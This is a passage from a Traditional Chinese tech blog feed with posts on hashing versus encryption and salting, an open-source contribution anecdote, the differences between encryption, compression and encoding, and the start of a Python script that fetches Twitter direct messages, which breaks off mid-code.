&lt;p&gt;其實雜湊在一些壓縮演算法或者排序演算法也都有用到，&lt;br /&gt;
但這邊只就資訊安全相關的部份進行討論。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;特性  &lt;ul&gt;
&lt;li&gt;無論原文的內容長短，透過雜湊演算法運算完的輸出都會是固定的長度，即輸出的長度不受原文長度影響。  &lt;/li&gt;
&lt;li&gt;雜湊演算法的輸出又被稱做「雜湊值」（hash value）。  &lt;/li&gt;
&lt;li&gt;不同雜湊演算法的輸出長度不同。  &lt;/li&gt;
&lt;li&gt;兩個原文的內容即便只差一個字，雜湊演算法產生的兩個輸出內容卻會差非常多。  &lt;/li&gt;
&lt;li&gt;相同的內容作為相同雜湊演算法的輸入，得到的輸出必定一樣。  &lt;/li&gt;
&lt;li&gt;不同的內容作為相同雜湊演算法的輸入，得到的相同輸出的機率極低。  &lt;/li&gt;
&lt;li&gt;無法將雜湊演算法的輸出解回原本的輸入，雜湊是單向的。  &lt;ul&gt;
&lt;li&gt;但因為相同輸入會得到相同輸出，所以最常見的破解方法就是透過 brute-force 的方式，用程式把各種可能的輸入都餵給雜湊演算法，得到輸出後，把輸入跟輸出以及所使用的雜湊演算法記起來，成為一張對應表（被稱做 rainbow table，彩虹表）。  &lt;/li&gt;
&lt;li&gt;然後拿雜湊值去其使用之雜湊演算法的 rainbow table 找尋輸入值，因為 rainbow table 是可以一直累積的，所以理論上來說，只要 rainbow table 夠大的話，就能夠找到原始的輸入值。  &lt;/li&gt;
&lt;li&gt;所以資安實務上會再為原始資料加入 salt 之後，才會丟給雜湊演算法運算，獲得加了 salt 以後的雜湊值。  &lt;ul&gt;
&lt;li&gt;salt 基本上就是額外加入的字串，可以用固定的規則改變原本的輸入值。  &lt;/li&gt;
&lt;li&gt;這樣的好處是，就算被破解了，破解的人拿到的字串仍然不會是密碼，拿去登入是不會成功的。  &lt;/li&gt;
&lt;li&gt;但在比對使用者輸入的密碼時，一樣可以加了 salt 之後再進行雜湊去比對，仍然可以驗證密碼是否正確，而安全性會增加。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用途  &lt;ul&gt;
&lt;li&gt;檔案校驗碼（Checksum）  &lt;ul&gt;
&lt;li&gt;用來快速判斷檔案是否和原本相同。  &lt;/li&gt;
&lt;li&gt;有在論壇下載過檔案的人應該都很常見到一長串 MD5 或 SHA-1 驗證碼，就是用來讓你快速檢查你下載的檔案裡頭的內容，是不是跟上傳者上傳的檔案一樣。  &lt;/li&gt;
&lt;li&gt;不一樣的話可能就是你載錯檔案、檔案有毀損或檔案被人加料了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不需要被還原的資料  &lt;ul&gt;
&lt;li&gt;例如：避免明文儲存使用者密碼  &lt;ul&gt;
&lt;li&gt;避免直接儲存使用者的明文密碼，除了避免資料庫外洩時，攻擊者無需進一步運算就可以直接得到明文密碼外，一方面也是尊重使用者，因為正常情況下只有使用者知道自己的密碼。  &lt;/li&gt;
&lt;li&gt;要簡單判斷網站有沒有明文儲存你的密碼最簡單的兩個方法：  &lt;ul&gt;
&lt;li&gt;寄信給你的時候有沒有直接把密碼寫在內文。  &lt;/li&gt;
&lt;li&gt;忘記密碼的時候不是要求你或幫你重新設定密碼，而是直接告訴你你的密碼。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;但因為相同原文透過相同的雜湊演算法會得到相同的輸出，所以可以在不明文儲存使用者密碼的情況下，確認使用者輸入的密碼是否正確。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常見演算法  &lt;ul&gt;
&lt;li&gt;SHA 系列：  &lt;ul&gt;
&lt;li&gt;SHA-0  &lt;/li&gt;
&lt;li&gt;SHA-1  &lt;ul&gt;
&lt;li&gt;SHA-1 已經被證明不夠安全。（在可接受的時間範圍內，可以找到內容不相同輸入卻得到相同輸出。）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SHA-2  &lt;ul&gt;
&lt;li&gt;SHA-256  &lt;/li&gt;
&lt;li&gt;SHA-512  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SHA-3  &lt;ul&gt;
&lt;li&gt;SHA3-256  &lt;/li&gt;
&lt;li&gt;SHA3-512  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MD5  &lt;ul&gt;
&lt;li&gt;MD5 也已經被證明不夠安全。（在可接受的時間範圍內，可以找到內容不相同輸入卻得到相同輸出。）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BLAKE2  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;結論  &lt;ul&gt;
&lt;li&gt;就是一串拿來做檢查的字串，但根據使用需求可以有不同的用途。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;所以，為什麼雜湊不是加密？&lt;/h2&gt;
&lt;p&gt;我個人認為，雜湊和加密很容易被人搞混的原因，主要是因為，雜湊和加密通常是一起使用的，常常被拿在一起講，所以久而久之就搞混了。  &lt;/p&gt;
&lt;p&gt;但其實可以透過以下幾點來區分：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加密需要密鑰，且可以透過解密得到原文。（加密可逆）  &lt;/li&gt;
&lt;li&gt;雜湊不需密鑰，無法逆向解出原始輸入。（雜湊不可逆）  &lt;ul&gt;
&lt;li&gt;雖然可以透過額外儲存的 rainbow table 來找尋原始輸入，但彩虹表是預先計算並儲存下來的，而不是雜湊演算法本身的設計。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;舉例  &lt;ul&gt;
&lt;li&gt;今天如果我拿到一串密文，我是有辦法透過解密，得到原始的明文的，而且如果使用非對稱式加密的話，我甚至還可以驗證傳送方是不是本人（是否有被進行中間人攻擊）。  &lt;ul&gt;
&lt;li&gt;雜湊演算法在這裡也會被使用，通常會被拿來檢驗傳送的訊息是否有被更改過。  &lt;/li&gt;
&lt;li&gt;傳送方附上原始訊息經過某個雜湊演算法得出的雜湊值，接收方在解開這個訊息之後，會透過相同的雜湊演算法來驗證。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;但如果是拿到一串雜湊值的話，理論上是無法逆向得到原始的明文的，根本無法拿來做資料的傳遞。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以別再說出「MD5 加密」、「MD5 解密」、「SHA-1 加密」、「SHA-1 解密」之類的話啦~  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;小測驗&lt;/h2&gt;
&lt;p&gt;如果這兩篇有看懂的話，應該就可以理解&lt;a href="https://mobile.twitter.com/orsonwang/status/944400953591021568"&gt;這個 tweet&lt;/a&gt; 在講什麼：  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;pkcs7 簽章使用 RSA 加密演算法對資料的 SHA256 雜湊值簽章，台灣的金融機構習慣對這簽章做 base64 編碼來避免古早用 Cobol 的系統以 ASCII 字碼接收而產生所有資料第 8 bit 都是 0 而引起的驗證錯誤。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;參考資料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://dotblogs.com.tw/regionbbs/2017/09/21/hashing_is_not_encryption"&gt;[Security] 雜湊不是加密，雜湊不是加密，雜湊不是加密。 | 小朱® 的技術隨手寫 - 點部落&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.securityinnovationeurope.com/blog/page/whats-the-difference-between-hashing-and-encrypting"&gt;What is The Difference Between Hashing and Encrypting&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/%E7%9B%90_(%E5%AF%86%E7%A0%81%E5%AD%A6)"&gt;鹽 (密碼學) - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Encryption"></category><category term="Hashing"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>我愛開源，因為會遇到路人幫我寫測試。</title><link href="https://blog.m157q.tw/posts/2017/12/24/i-love-open-source-because-someone-will-write-testings-for-me/" rel="alternate"></link><published>2017-12-26T12:05:12+08:00</published><updated>2017-12-26T12:05:12+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-24:posts/2017/12/24/i-love-open-source-because-someone-will-write-testings-for-me/</id><summary type="html">&lt;h2&gt;先講結論&lt;/h2&gt;
&lt;p&gt;感恩開源！讚嘆開源！（啥）【詳見附 1】  &lt;/p&gt;
&lt;h2&gt;故事內文&lt;/h2&gt;
&lt;p&gt;故事緣起於 9 月底的某個星期六晚上&lt;br /&gt;
因為太邊緣了沒人約&lt;br /&gt;
加上一時興起&lt;br /&gt;
於是花了幾個小時&lt;br /&gt;
用 Python 寫了個把文字從橫書轉成直書的小程式&lt;br /&gt;
詳情請見：&lt;a href="https://github.com/M157q/hor2vec"&gt;https://github.com/M157q/hor2vec&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;之後有收到些回饋&lt;br /&gt;
有人說想寫個 JavaScript 版&lt;br /&gt;
也有說人說想寫個 Rust 版  &lt;/p&gt;
&lt;p&gt;也有收到網友的訊息說&lt;br /&gt;
在隔幾天的十月初&lt;br /&gt;
日本知名的 GitHub 使用者 mattn&lt;br /&gt;
（在 GitHub 上有 3.6k followers，有用 Vim 和寫 Golang 的人應該對他的 id 不陌生）&lt;br /&gt;
也用 Golang 寫了一個用途一樣的程式&lt;br /&gt;
&lt;a href="https://github.com/mattn/tate"&gt;https://github.com/mattn/tate&lt;/a&gt;&lt;br /&gt;
裏面有些我沒有實作的功能可以參考看看  &lt;/p&gt;
&lt;p&gt;看了一下才知道&lt;br /&gt;
原來日文的平假名和片假名也有分全形和半形&lt;br /&gt;
然後連標點符號也可以從橫的轉成直的  &lt;/p&gt;
&lt;p&gt;於是我就開了幾個 issue 紀錄要新增的功能&lt;br /&gt;
然後因為我是測試苦手不太會寫測試&lt;br /&gt;
所以一開始就沒寫測試&lt;br /&gt;
於是就&lt;a href="https://github.com/M157q/hor2vec/issues/5"&gt;開了一個 issue 提醒我自己要寫測試&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;沒！想！到！&lt;br /&gt;
竟然收到一個路人的 pull request 幫我加上了測試&lt;br /&gt;
&lt;a href="https://github.com/M157q/hor2vec/pull/6"&gt;https://github.com/M157q/hor2vec/pull/6&lt;/a&gt;&lt;br /&gt;
花了 27 個 commits&lt;br /&gt;
更動了 400 多行程式碼&lt;br /&gt;
太神奇啦！&lt;br /&gt;
這種路過幫人寫測試的神奇小精靈哪裡找啊？  &lt;/p&gt;
&lt;p&gt;最神奇的還不只這個&lt;br /&gt;
重點是他的 27 個 commits 裡頭的內容之詳細&lt;br /&gt;
比他更改的程式碼還多行&lt;br /&gt;
實在是太令人賞心悅目&lt;br /&gt;
&lt;a href="https://github.com/M157q/hor2vec/pull/6/commits/0f67f0fe8be0312b08195b8157fac5f0be6c9830"&gt;https://github.com/M157q/hor2vec/pull/6/commits/0f67f0fe8be0312b08195b8157fac5f0be6c9830&lt;/a&gt;&lt;br /&gt;
於是我就忍不住在底下詢問他&lt;br /&gt;
到底是怎麼寫 commit message 的  &lt;/p&gt;
&lt;p&gt;他也很認真得&lt;a href="https://github.com/M157q/hor2vec/pull/6#issuecomment-343633972"&gt;給了一個很詳細的回覆&lt;/a&gt;&lt;br /&gt;
真的讓我很佩服&lt;br /&gt;
推薦對如何把 commit message 寫好有興趣的人點進去看一下  &lt;/p&gt;
&lt;p&gt;開源大法太神奇啦&lt;br /&gt;
竟然可以吸引到幫人寫測試的小精靈&lt;br /&gt;
感恩開源！讚嘆開源！&lt;br /&gt;
你在等什麼？&lt;br /&gt;
還不趕快加入開源的行列嗎？&lt;br /&gt;
搞不好你也可以找到你的開源小精靈並向對方學習喔！  &lt;/p&gt;
&lt;p&gt;（我好像該去 Review 他的 PR 了...）  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;附錄&lt;/h2&gt;
&lt;p&gt;[1] 開源&lt;br /&gt;
全稱「開放源始碼」或「開放原始碼」&lt;br /&gt;
英文 "Open Source"，常被戲稱為「歐噴壽司」&lt;br /&gt;
（例句：「我今天放了一顆歐噴壽司，釣到一個路過的小精靈幫我寫測試，潮爽 der」）&lt;br /&gt;
為一種將程式原始程式碼公開讓人檢視、修改、散佈、使用的行為。&lt;br /&gt;
在台灣隸屬宗教為「開源大法教」（這是玩笑&lt;br /&gt;
教眾口號為「感恩開源！讚嘆開源！」（這也是玩笑&lt;br /&gt;
年度最大教眾聚會為「開源人年會」&lt;br /&gt;
英文全名為 Conference for Open Source Coders, Users and Promoters&lt;br /&gt;
簡稱「COSCUP」，常被戲稱為「餘弦杯」及常被誤認為台灣年度最大型 Cosplay 比賽&lt;br /&gt;
官方網址：&lt;a href="https://coscup.org"&gt;https://coscup.org&lt;/a&gt;  &lt;/p&gt;</summary><category term="Open Source"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>如何區分加密、壓縮、編碼</title><link href="https://blog.m157q.tw/posts/2017/12/23/differences-between-encryption-compression-and-encoding/" rel="alternate"></link><published>2017-12-25T17:49:55+08:00</published><updated>2017-12-25T17:49:55+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-23:posts/2017/12/23/differences-between-encryption-compression-and-encoding/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;base64 加密？base64 壓縮？base64 編碼？傻傻分不清？&lt;br /&gt;
究竟：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加密（Encrypt）  &lt;/li&gt;
&lt;li&gt;壓縮（Compress）  &lt;/li&gt;
&lt;li&gt;編碼（Encode）  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;到底有什麼差別？  &lt;/p&gt;
&lt;p&gt;明明不管是中文還是英文，&lt;br /&gt;
這 3 個詞長得一點都不像，&lt;br /&gt;
那到底為什麼很多人會把這 3 種東西都當成加密呢？  &lt;/p&gt;
&lt;p&gt;主要是因為透過這 3 種方式處理過後的資料，&lt;br /&gt;
都會長的跟原本不一樣，&lt;br /&gt;
一般人無法直接辨別，&lt;br /&gt;
就覺得是被加密處理過的密文天書。  &lt;/p&gt;
&lt;p&gt;然而，&lt;br /&gt;
並不是變成人看不懂的東西就叫作「加密」。&lt;br /&gt;
如果誤用的話，&lt;br /&gt;
很有可能你自以為加密了的東西，&lt;br /&gt;
實際上並沒有經過加密處理，&lt;br /&gt;
隨隨便便就可以被懂其中差異的人拿到你寶貴的原始文字（最有可能的就是你的密碼啦）。&lt;br /&gt;
以下就來簡單說明這 3 種東西各自的特性，&lt;br /&gt;
會特別拿 base64 來說，&lt;br /&gt;
希望能夠端正一下視聽。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;加密（Encryption）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;特性  &lt;ul&gt;
&lt;li&gt;首先得產生一個新的字串作為密鑰，也就是一把鑰匙。  &lt;/li&gt;
&lt;li&gt;原文與密鑰作為加密演算法的輸入，得到的輸出即為加密過後的密文。  &lt;/li&gt;
&lt;li&gt;可以想像成，加密演算法幫你打造出你給它的這把密鑰才可以開啟的寶箱，幫你把原文放入寶箱後，用這把密鑰上鎖，上鎖後的寶盒就是密文，看不到裡面的東西是什麼。  &lt;/li&gt;
&lt;li&gt;這種只有一把鑰匙的加密演算法被稱為對稱式加密（Symmetric Encryption）。  &lt;/li&gt;
&lt;li&gt;問題也很明顯，要是你沒有保管好你的鑰匙，或者你的鑰匙構造太簡單被人打造出一模一樣的鑰匙，別人就可以打開寶箱，拿到內容物。  &lt;ul&gt;
&lt;li&gt;比如說你的密鑰是一個叫作 "5566" 的字串，因為太好猜了，所以很容易被解密回來。  &lt;/li&gt;
&lt;li&gt;這也是為什麼通常在生成密鑰的時候會建議長度愈長愈好，尤其現在電腦的運算能力愈來愈強，以往透過程式一個一個暴力猜測密鑰的方式，在相同單位時間內可以猜的數量變多了，密鑰長度太短的話，很容易就被猜到。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;因為對稱式加密的安全性以及在實際應用上不夠理想，於是乎，出現了安全性更高，應用範圍更廣的非對稱式加密（Asymmetric Encryption）。  &lt;/li&gt;
&lt;li&gt;非對稱式加密演算法會有兩把鑰匙，一把稱做公鑰（可以公開），另一把稱做私鑰（自己要藏好）。  &lt;/li&gt;
&lt;li&gt;非對稱式加密除了可以做到加密以外，還可以生成數位簽章，確認密文的傳送方身份真的是本人，這篇不會細談。  &lt;/li&gt;
&lt;li&gt;但這並不代表對稱式加密就沒有人用，兩者各有各的優缺點，所以實際應用上通常都是視情況而定，常常會有兩者一起使用的情形。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常見演算法  &lt;ul&gt;
&lt;li&gt;對稱式：DES, 3DES, AES  &lt;/li&gt;
&lt;li&gt;非對稱式：RSA, DSA, ECC  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;結論  &lt;ul&gt;
&lt;li&gt;沒有這把鑰匙（無論是拿到或猜到）就無法得知真正的訊息。  &lt;/li&gt;
&lt;li&gt;使用 base64 的時候不需要密鑰，而且任何人編碼的 base64 訊息，任何人都可以經過 base64 解碼回來，所以 base64 不是加密。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;壓縮（Compression）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;特性  &lt;ul&gt;
&lt;li&gt;輸入（通常是檔案）經過壓縮演算法後得到的輸出，大小比輸入來得小。  &lt;/li&gt;
&lt;li&gt;根據有無失真又區分為非破壞性（無損）壓縮與破壞性（有損）壓縮：  &lt;ul&gt;
&lt;li&gt;無損壓縮：無失真、壓縮率沒辦法到太高，通常用在文件檔案這種不能缺少原始資料的東西。  &lt;/li&gt;
&lt;li&gt;有損壓縮：失真、壓縮率可以比較高，通常用在圖片、視訊、音訊，因為可以去掉人眼或人耳無法辨認出差異的部份，降低檔案大小可以有效提升傳輸時的效率。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常見演算法  &lt;ul&gt;
&lt;li&gt;zip, gzip, rar, 7zip, jpg, mp3, mp4, Huffman coding  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;結論  &lt;ul&gt;
&lt;li&gt;沒有讓輸出比輸入小的演算法就不是壓縮。  &lt;/li&gt;
&lt;li&gt;經過 base64 編碼後得到的結果，實際上會比原檔案多三分之一左右，所以 base64 不是壓縮。  &lt;ul&gt;
&lt;li&gt;base64 使用 64 個可顯示的 ASCII 字元來表示二進位資料。  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;2^6 = 64&lt;/code&gt;，也就是一個 base64 單元表示 6 位元，即用 1 個 ASCII 字元（8 bits），表示 6 bits 資料，比例為 &lt;code&gt;4:3&lt;/code&gt;，也就大概多了 &lt;code&gt;1/3&lt;/code&gt; 出來。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;那為什麼很多地方會提到在網頁上用 base64 表示圖片可以加速？  &lt;ul&gt;
&lt;li&gt;主要是因為把圖片直接以 base64 字串的形式呈現在網頁上的話，就不需要額外再發 request 去要圖片。  &lt;/li&gt;
&lt;li&gt;但因為 base64 會把檔案變大不少，所以很多人會先把圖片經過 gzip 壓縮後，再編碼成 base64 字串。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;編碼（Encoding）&lt;/h3&gt;
&lt;p&gt;編碼牽涉的範圍非常廣，&lt;br /&gt;
包含了：字元編碼（Character Encoding）、音訊編碼（Audio Encoding）、視訊編碼（Video Encoding）、…… 等等，&lt;br /&gt;
所以在這篇文章不會仔細講。&lt;br /&gt;
其實廣義上來說，&lt;br /&gt;
上述提到的加密與壓縮都算是編碼的其中一種，&lt;br /&gt;
但這裡就把上述兩個排除。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;特性  &lt;ul&gt;
&lt;li&gt;將原文轉換成另外一種表達方式。  &lt;/li&gt;
&lt;li&gt;不需要密鑰，只要知道你用哪個編碼演算法，任何人都可以解碼。  &lt;ul&gt;
&lt;li&gt;這也是單純編碼被拿來誤用成加密演算法最危險的地方，因為完全不需要花時間猜密鑰。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不同的編碼演算法有不同的特性  &lt;ul&gt;
&lt;li&gt;錯誤偵測（Error Detection）  &lt;ul&gt;
&lt;li&gt;檢查訊息在經過傳送後是否已經改變。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;錯誤校正（Error Correction）  &lt;ul&gt;
&lt;li&gt;自動修正在經過傳送後錯誤的內容。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;方便資料進行傳輸  &lt;ul&gt;
&lt;li&gt;以不同的形式表示相同的資料。  &lt;/li&gt;
&lt;li&gt;例如: base64 就把二進位的資料用 ASCII 來表示。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常見演算法  &lt;ul&gt;
&lt;li&gt;base64, urlencode, hamming code,  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;有密鑰：加密  &lt;/li&gt;
&lt;li&gt;輸出比輸入小：壓縮  &lt;/li&gt;
&lt;li&gt;其他：編碼  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Encryption"></category><category term="Compression"></category><category term="Encoding"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>用 Python 寫個程式抓出我在 Twitter 上存了哪些 tweet</title><link href="https://blog.m157q.tw/posts/2017/12/22/write-a-python-script-to-retrieve-twitter-direct-messsages/" rel="alternate"></link><published>2017-12-24T22:58:08+08:00</published><updated>2017-12-24T22:58:08+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-22:posts/2017/12/22/write-a-python-script-to-retrieve-twitter-direct-messsages/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;身為一個邊緣人，&lt;br /&gt;
沒有 Instagram 帳號，&lt;br /&gt;
卻有台灣沒什麼人用的 Twitter 帳號也是很合理的。  &lt;/p&gt;
&lt;p&gt;其實 Twitter 上很容易得到國外第一手即時資訊，&lt;br /&gt;
常常看到好幾天之後才在 Facebook 或台灣的媒體看到消息，&lt;br /&gt;
很適合我這種資訊焦慮症的人（？  &lt;/p&gt;
&lt;p&gt;Twitter 也很容易跟一些很有名的人直接交流，&lt;br /&gt;
像上一篇翻譯文章的授權，&lt;br /&gt;
我就是直接在 Twitter 上問作者，&lt;br /&gt;
大概五分鐘之內，沒錯，就是短短幾分鐘之內，就收到作者同意的回覆。  &lt;/p&gt;
&lt;p&gt;總之，&lt;br /&gt;
我平常在用 Twitter 的時候有個習慣，&lt;br /&gt;
就是把我看到覺得值得保留下來的 tweet 分成兩類，&lt;br /&gt;
一類是比較不嚴肅的，把該 tweet 私訊給自己。&lt;br /&gt;
另一類是比較嚴肅的，把該 tweet 私訊給另外一個 RSS bot 帳號。&lt;br /&gt;
（這個 RSS bot 有機會的話會發篇文章講一下）  &lt;/p&gt;
&lt;p&gt;這裡要來用 Python 寫個程式，&lt;br /&gt;
把今年存下來的這兩大類 tweet 抓出來，&lt;br /&gt;
其實我不確定是不是一定會成功，&lt;br /&gt;
大概只有 87% 的把握，&lt;br /&gt;
總之接下來就一步步講一下要怎麼做。  &lt;/p&gt;
&lt;p&gt;（謎之音：最愛寫這種無用的小程式了。）  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;步驟&lt;/h2&gt;
&lt;h3&gt;看有哪個 API 可以拿來用&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developer.twitter.com/en/docs/direct-messages/sending-and-receiving/api-reference/list-events"&gt;GET direct_messages/events/list — Twitter Developers&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最多只能抓取最近的 200 則私訊（不限 30 天內。）  &lt;/li&gt;
&lt;li&gt;如果超過 200 則的話，只能抓取最近 30 天內的私訊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;取得 Access Token&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;到 &lt;a href="https://apps.twitter.com/"&gt;https://apps.twitter.com/&lt;/a&gt; 建立一個新的 App。  &lt;/li&gt;
&lt;li&gt;記下 Consumer Key (API Key) 和 Consumer Secret (API Secret)  &lt;/li&gt;
&lt;li&gt;點選 Permissions  &lt;ul&gt;
&lt;li&gt;選取 Read, Write and Access direct messages。（原本只有 Read, Write）  &lt;/li&gt;
&lt;li&gt;選好之後按底下的 Update Settings  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;點進去剛建立的 App，移到底下，點選建立 Access Token。  &lt;/li&gt;
&lt;li&gt;記下 Access Token 和 Access Token Secret  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;安裝要使用的 Python 套件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/bear/python-twitter"&gt;https://github.com/bear/python-twitter&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;pip install python-twitter&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;撰寫程式&lt;/h3&gt;
&lt;p&gt;因為兩個的作法類似，&lt;br /&gt;
這邊就以抓出比較嚴肅一點的 tweet 作為範例，&lt;br /&gt;
幾行就可以寫完了。  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python3  &lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;urllib&lt;/span&gt;  

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;twitter&lt;/span&gt;  


&lt;span class="c1"&gt;# Fill these contants by yourself.  &lt;/span&gt;
&lt;span class="n"&gt;CONSUMER_KEY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;CONSUMER_SECRET&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;ACCESS_TOKEN_KEY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;ACCESS_TOKEN_SECRET&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;MY_TWITTER_ID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;  
&lt;span class="n"&gt;MY_BOT_TWITTER_ID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;  


&lt;span class="n"&gt;api&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;twitter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Api&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;  
    &lt;span class="n"&gt;consumer_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;CONSUMER_KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="n"&gt;consumer_secret&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;CONSUMER_SECRET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="n"&gt;access_token_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ACCESS_TOKEN_KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="n"&gt;access_token_secret&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ACCESS_TOKEN_SECRET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="c1"&gt;# Twitter API limitation:  &lt;/span&gt;
